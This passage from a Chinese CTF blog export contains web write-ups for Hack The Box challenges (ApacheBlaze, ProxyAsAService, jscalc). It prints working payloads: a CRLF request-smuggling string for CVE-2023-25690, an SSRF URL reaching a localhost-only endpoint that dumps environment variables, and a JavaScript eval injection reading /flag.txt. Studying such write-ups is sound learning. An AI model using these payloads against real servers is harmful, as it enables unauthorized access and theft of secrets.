request.headers.get(&#x27;X-Forwarded-Host&#x27;) == &#x27;dev.apacheblaze.local&#x27;:</span><br><span class=\"line\">            return jsonify(&#123;</span><br><span class=\"line\">                &#x27;message&#x27;: f&#x27;&#123;app.config[&quot;FLAG&quot;]&#125;&#x27;</span><br><span class=\"line\">            &#125;), 200</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            return jsonify(&#123;</span><br><span class=\"line\">                &#x27;message&#x27;: &#x27;This game is currently available only from dev.apacheblaze.local.&#x27;</span><br><span class=\"line\">            &#125;), 200</span><br><span class=\"line\"></span><br><span class=\"line\">    else:</span><br><span class=\"line\">        return jsonify(&#123;</span><br><span class=\"line\">            &#x27;message&#x27;: &#x27;This game is currently unavailable due to internal maintenance.&#x27;</span><br><span class=\"line\">        &#125;), 200</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>还以为常规方法只要 game<mark>click_topia，以及 X-Forwarded-Host</mark>dev.apacheblaze.local 就能拿到 flag，是我大意了，试了一会发现根本出不了 flag，又去查看了一下 api.js</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$(document).ready(function() &#123;</span><br><span class=\"line\">  $(&quot;.game a&quot;).click(function(event) &#123;</span><br><span class=\"line\">      event.preventDefault();</span><br><span class=\"line\">      var gameName = $(this).attr(&quot;div&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">      $.ajax(&#123;</span><br><span class=\"line\">          url: &quot;/api/games/&quot; + gameName,</span><br><span class=\"line\">          success: function(data) &#123;</span><br><span class=\"line\">              var message = data.message;</span><br><span class=\"line\">              $(&quot;#gameplayresults&quot;).text(message);</span><br><span class=\"line\">          &#125;,</span><br><span class=\"line\">          error: function() &#123;</span><br><span class=\"line\">              $(&quot;#gameplayresults&quot;).text(&quot;Error fetching API data.&quot;);</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure></p>\n<p>查看到了里面有个 url: &quot;/api/games/&quot; + gameName, 我想到了 gameName 换成 click_topia 然后提示 app.py 里面的</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">return jsonify(&#123;</span><br><span class=\"line\">               &#x27;message&#x27;: &#x27;This game is currently available only from dev.apacheblaze.local.&#x27;</span><br><span class=\"line\">           &#125;), 200</span><br></pre></td></tr></table></figure></p>\n<p>加上 X-Forwarded-Host==dev.apacheblaze.local 还是没有反应，试了很久发现还是不行，查看了大佬的 wp 发现我方法错了</p>\n<p><img data-src=\"/pic/image-20231210153436785.png\" alt=\"image-20231210153436785\" /></p>\n<p>应该向去查看 httpd.conf 的语法，里面有一个重定向，并且还设置了一个 proxy 也就说说我刚刚上面那两个其实都是一个，现在很清楚了，端口 1337 和 8080 上的 2 个虚拟主机（反向代理和负载均衡器）在请求处理期间被附加到 X-Forwarded-Host 标头。</p>\n<p>并且大佬还说了利用方法 HTTP 请求走私攻击 (CVE-2023–25690)</p>\n<p>通过这个漏洞，我们了解到我们可以在发送到目标的第一个请求中隐藏第二个请求（使用 <code>\\r\\n\\r</code>  拆分方法）。这使我们能够直接从反向代理发送请求，因此我们不会将其他内容附加到 X-Forwarded-Host 标头的末尾</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /api/games/click_topia HTTP/1.1</span><br><span class=\"line\">主机：dev.apacheblaze.local </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">GET / HTTP/1.1</span><br><span class=\"line\">主机：localhost:1337 </span><br><span class=\"line\"></span><br><span class=\"line\">-------------------------- ------------</span><br><span class=\"line\"></span><br><span class=\"line\">编码提醒: </span><br><span class=\"line\"></span><br><span class=\"line\">\\r\\n -&gt; %0d%0a </span><br><span class=\"line\">\\r\\n\\r -&gt; %0d%0a%0d</span><br></pre></td></tr></table></figure></p>\n<p>进行 url 编码</p>\n<p><img data-src=\"/pic/image-20231210154202586.png\" alt=\"image-20231210154202586\" /></p>\n<p>需要注意的是进行常规的 url 编码后无法编码 %0d 需要自己加上去最后是</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/api/games/click_topia%20HTTP/1.1%0d%0aHost:%20dev.apacheblaze.local%0d%0a%0d%0aGET%20/ HTTP/1.1</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"proxyasaservice\"><a class=\"anchor\" href=\"#proxyasaservice\">#</a> ProxyAsAService</h3>\n<p>Experience the freedom of the web with ProxyAsAService. Because online privacy and access should be for everyone, everywhere.</p>\n<p>这个题又是一个 python 写的，题目描述了代理我们一个一个文件开始看</p>\n<p>首先是 dockerfiler</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">EXPOSE 1337</span><br><span class=\"line\">ENV FLAG=HTB&#123;f4k3_fl4g_f0r_t3st1ng&#125;</span><br></pre></td></tr></table></figure></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS1hcHAtMGg5ZHFxNjl3dmxweTBzM3Z3OHFwLnB5\">然后就是代码了 app.py</span></p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from flask import Flask, jsonify</span><br><span class=\"line\">from application.blueprints.routes import proxy_api, debug</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\">app.config.from_object(&#x27;application.config.Config&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">app.register_blueprint(proxy_api, url_prefix=&#x27;/&#x27;)</span><br><span class=\"line\">app.register_blueprint(debug, url_prefix=&#x27;/debug&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">@app.errorhandler(404)</span><br><span class=\"line\">def not_found(error):</span><br><span class=\"line\">    return jsonify(&#123;&#x27;error&#x27;: &#x27;Not Found&#x27;&#125;), 404</span><br><span class=\"line\"></span><br><span class=\"line\">@app.errorhandler(403)</span><br><span class=\"line\">def forbidden(error):</span><br><span class=\"line\">    return jsonify(&#123;&#x27;error&#x27;: &#x27;Not Allowed&#x27;&#125;), 403</span><br><span class=\"line\"></span><br><span class=\"line\">@app.errorhandler(400)</span><br><span class=\"line\">def bad_request(error):</span><br><span class=\"line\">    return jsonify(&#123;&#x27;error&#x27;: &#x27;Bad Request&#x27;&#125;), 400</span><br></pre></td></tr></table></figure></p>\n<p>里面就是一些控制报错输出查看引用包，routes</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from flask import Blueprint, request, Response, jsonify, redirect, url_for</span><br><span class=\"line\">from application.util import is_from_localhost, proxy_req</span><br><span class=\"line\">import random, os</span><br><span class=\"line\"></span><br><span class=\"line\">SITE_NAME = &#x27;reddit.com&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">proxy_api = Blueprint(&#x27;proxy_api&#x27;, __name__)</span><br><span class=\"line\">debug     = Blueprint(&#x27;debug&#x27;, __name__)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">@proxy_api.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class=\"line\">def proxy():</span><br><span class=\"line\">    url = request.args.get(&#x27;url&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    if not url:</span><br><span class=\"line\">        cat_meme_subreddits = [</span><br><span class=\"line\">            &#x27;/r/cats/&#x27;,</span><br><span class=\"line\">            &#x27;/r/catpictures&#x27;,</span><br><span class=\"line\">            &#x27;/r/catvideos/&#x27;</span><br><span class=\"line\">        ]</span><br><span class=\"line\"></span><br><span class=\"line\">        random_subreddit = random.choice(cat_meme_subreddits)</span><br><span class=\"line\"></span><br><span class=\"line\">        return redirect(url_for(&#x27;.proxy&#x27;, url=random_subreddit))</span><br><span class=\"line\">    </span><br><span class=\"line\">    target_url = f&#x27;http://&#123;SITE_NAME&#125;&#123;url&#125;&#x27;</span><br><span class=\"line\">    response, headers = proxy_req(target_url)</span><br><span class=\"line\"></span><br><span class=\"line\">    return Response(response.content, response.status_code, headers.items())</span><br><span class=\"line\"></span><br><span class=\"line\">@debug.route(&#x27;/environment&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class=\"line\">@is_from_localhost</span><br><span class=\"line\">def debug_environment():</span><br><span class=\"line\">    environment_info = &#123;</span><br><span class=\"line\">        &#x27;Environment variables&#x27;: dict(os.environ),</span><br><span class=\"line\">        &#x27;Request headers&#x27;: dict(request.headers)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    return jsonify(environment_info)</span><br></pre></td></tr></table></figure></p>\n<p>导入了 os，下面的 debug_environment (): 还调用了 os 输出了 os.environ</p>\n<p>回到 app.py 查看路由控制</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">app.register_blueprint(proxy_api, url_prefix=&#x27;/&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">app.register_blueprint(debug, url_prefix=&#x27;/debug&#x27;)</span><br></pre></td></tr></table></figure></p>\n<p>这里都是调用的 routes 里面的函数 proxy_api</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@proxy_api.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class=\"line\">def proxy():</span><br><span class=\"line\">    url = request.args.get(&#x27;url&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    if not url:</span><br><span class=\"line\">        cat_meme_subreddits = [</span><br><span class=\"line\">            &#x27;/r/cats/&#x27;,</span><br><span class=\"line\">            &#x27;/r/catpictures&#x27;,</span><br><span class=\"line\">            &#x27;/r/catvideos/&#x27;</span><br><span class=\"line\">        ]</span><br><span class=\"line\"></span><br><span class=\"line\">        random_subreddit = random.choice(cat_meme_subreddits)</span><br><span class=\"line\"></span><br><span class=\"line\">        return redirect(url_for(&#x27;.proxy&#x27;, url=random_subreddit))</span><br><span class=\"line\">    </span><br><span class=\"line\">    target_url = f&#x27;http://&#123;SITE_NAME&#125;&#123;url&#125;&#x27;</span><br><span class=\"line\">    response, headers = proxy_req(target_url)</span><br><span class=\"line\"></span><br><span class=\"line\">    return Response(response.content, response.status_code, headers.items())</span><br></pre></td></tr></table></figure></p>\n<p>这个代码控制了用户的默认界面为这 3 个中的随机一个然后就是</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@debug.route(&#x27;/environment&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class=\"line\">@is_from_localhost</span><br><span class=\"line\">def debug_environment():</span><br><span class=\"line\">    environment_info = &#123;</span><br><span class=\"line\">        &#x27;Environment variables&#x27;: dict(os.environ),</span><br><span class=\"line\">        &#x27;Request headers&#x27;: dict(request.headers)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    return jsonify(environment_info)</span><br></pre></td></tr></table></figure></p>\n<p>也就是说只要调用了 /debug/environment 就能得到 flag</p>\n<p>需要注意的是 @is_from_localhost 调用了一个过滤函数</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">RESTRICTED_URLS = [&#x27;localhost&#x27;, &#x27;127.&#x27;, &#x27;192.168.&#x27;, &#x27;10.&#x27;, &#x27;172.&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">def is_safe_url(url):</span><br><span class=\"line\">    for restricted_url in RESTRICTED_URLS:</span><br><span class=\"line\">        if restricted_url in url:</span><br><span class=\"line\">            return False</span><br><span class=\"line\">    return True</span><br><span class=\"line\"></span><br><span class=\"line\">def is_from_localhost(func):</span><br><span class=\"line\">    @functools.wraps(func)</span><br><span class=\"line\">    def check_ip(*args, **kwargs):</span><br><span class=\"line\">        if request.remote_addr != &#x27;127.0.0.1&#x27;:</span><br><span class=\"line\">            return abort(403)</span><br><span class=\"line\">        return func(*args, **kwargs)</span><br><span class=\"line\">    return check_ip</span><br></pre></td></tr></table></figure></p>\n<p>这里过滤了 127.0.0.1 那我们可以使用 0.0.0.0 也是可以的，</p>\n<p>使用</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://188.166.175.58:31579/?url=@0.0.0.0:1337/debug/environment</span><br></pre></td></tr></table></figure></p>\n<p>即可绕过</p>\n<h3 id=\"jscalc\"><a class=\"anchor\" href=\"#jscalc\">#</a> jscalc</h3>\n<p>这个题比较简单使用 js 的 fs</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /api/calculate HTTP/1.1</span><br><span class=\"line\">Host: 188.166.175.58:31222</span><br><span class=\"line\">Content-Length: 65</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36</span><br><span class=\"line\">Content-Type: application/json</span><br><span class=\"line\">Accept: */*</span><br><span class=\"line\">Origin: http://188.166.175.58:31222</span><br><span class=\"line\">Referer: http://188.166.175.58:31222/</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.9</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&quot;formula&quot;:&quot;require(&#x27;fs&#x27;).readFileSync(&#x27;/flag.txt&#x27;).toString();&quot;&#125;</span><br></pre></td></tr></table></figure></p>\n<p>直接得到 flag</p>\n",
            "tags": [
                "WEB"
            ]
        }
    ]
}